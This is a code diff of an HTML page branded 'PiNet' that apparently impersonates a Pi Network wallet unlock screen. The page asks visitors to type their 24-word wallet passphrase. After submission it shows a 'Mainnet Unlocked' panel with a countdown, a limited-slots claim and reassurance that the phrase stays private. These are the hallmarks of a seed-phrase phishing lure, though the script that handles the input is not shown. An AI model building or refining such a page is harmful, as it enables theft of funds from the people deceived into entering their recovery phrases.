@@ -1,66 +1,62 @@
 <!DOCTYPE html>
-<!-- Mobile frame wrapper so the site looks like a mobile layout on all screens -->
-<div class="app-frame">
-<!-- Top Header (purple strip) -->
-<header class="topbar">
-<div class="topbar__left">
-<a class="link" href="#" title="Download Pi Browser">Download Pi Browser</a>
-</div>
-<div class="topbar__center">
-<img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="logo" />
-<a class="home" href="#" aria-label="Home">Home</a>
-</div>
-<div class="topbar__right">
-<button class="back-btn" type="button" aria-label="Back">&lt;</button>
-</div>
-</header>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PiNet – Unlock Pi Wallet</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- Top Header (purple strip) -->
+  <header class="topbar">
+    <div class="topbar__left">
+      <a class="link" href="#" title="Download Pi Browser">Download Pi Browser</a>
+    </div>
+    <div class="topbar__center">
+      <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="logo" />
+      <a class="home" href="#" aria-label="Home">Home</a>
+    </div>
+    <div class="topbar__right">
+      <button class="back-btn" type="button" aria-label="Back">&lt;</button>
+    </div>
+  </header>
 
+  <!-- Main content -->
+  <main class="main">
+    <div class="hero">
+      <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="hero__logo" />
+      <h1 class="hero__title">Welcome to the PiNet</h1>
+    </div>
 
-<!-- Main content -->
-<main class="main">
-<div class="hero">
-<img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="hero__logo" />
-<h1 class="hero__title">Welcome to the PiNet</h1>
-</div>
+    <section class="card">
+      <h2 class="card__title">Unlock Pi Wallet</h2>
+      <textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here" rows="4"></textarea>
+      <button id="unlockBtn" class="btn btn--primary" type="button">Unlock With Passphrase</button>
+    </section>
 
+    <!-- Result / Unlocked panel (hidden until unlocked) -->
+    <section id="unlocked" class="card card--success" hidden>
+      <div class="unlocked__header">
+        <h3 class="unlocked__title">Mainnet Unlocked</h3>
+        <img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="unlocked__logo" />
+      </div>
+      <p class="meta"><strong>Time remaining :</strong> <span id="countdown">24:00:00</span></p>
+      <p class="meta"><strong>Requirement:</strong> KYC successfully completed</p>
+      <p class="meta"><strong>Remaining slots:</strong> 518 out of 31,415</p>
 
-<section class="card">
-<h2 class="card__title">Unlock Pi Wallet</h2>
+      <div class="notice">
+        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? You can create a new wallet, but all your it in your previous wallet will be inaccessible. 
+          <a id="createNewWallet" href="https://www.pinet.com" target="_blank" rel="noopener noreferrer">You can create a new wallet</a>
+        </p>
+      </div>
+    </section>
 
+    <footer class="footer">
+      <small>Note: This web page is designed to work on all mobile screens properly.</small>
+    </footer>
+  </main>
 
-<label for="passphrase" class="sr-only">Enter your 24-word passphrase here</label>
-<textarea id="passphrase" class="input" placeholder="Enter your 24-word passphrase here" rows="4"></textarea>
-
-
-<button id="unlockBtn" class="btn btn--primary" type="button">Unlock With Passphrase</button>
-</section>
-
-
-<!-- Result / Unlocked panel (hidden until unlocked) -->
-<section id="unlocked" class="card card--success" hidden>
-<div class="unlocked__header">
-<h3 class="unlocked__title">Mainnet Unlocked</h3>
-<img src="https://ik.imagekit.io/digitalmake/PiNet..png" alt="PiNet logo" class="unlocked__logo" />
-</div>
-<p class="meta"><strong>Time remaining :</strong> <span id="countdown">24:00:00</span></p>
-<p class="meta"><strong>Requirement:</strong> KYC successfully completed</p>
-<p class="meta"><strong>Remaining slots:</strong> 518 out of 31,415</p>
-
-
-<div class="notice">
-<p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
-<p>Lost your passphrase? You can create a new wallet, but all your it in your previous wallet will be inaccessible. <a id="createNewWallet" href="https://www.pinet.com" target="_blank" rel="noopener noreferrer">You can create a new wallet</a></p>
-</div>
-</section>
-
-
-<footer class="footer">
-</footer>
-</main>
-</div>
-
-
-<script src="app.js"></script>
+  <script src="app.js"></script>
 </body>
 </html>
-
